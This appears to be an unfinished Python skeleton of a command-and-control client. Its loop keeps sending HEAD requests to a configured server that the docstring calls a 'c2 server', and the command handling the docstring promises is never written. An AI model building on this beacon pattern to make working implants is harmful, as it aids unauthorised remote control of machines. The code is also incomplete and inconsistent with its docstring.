import CONST
import http.client

class Client:

    def __init__(self):
        pass

    def keep_alive(self):
        """
        sends GET request to server every {interval} seconds
        handles the command from c2 server if sent
        """
        while True:
            connection = http.client.HTTPConnection(CONST.SERVER_IP, CONST.SERVER_PORT)
            connection.request("HEAD", "/")
            response = connection.getresponse()

def main():
    c1 = Client()
    c1.keep_alive()

if __name__ == '__main__':
    main()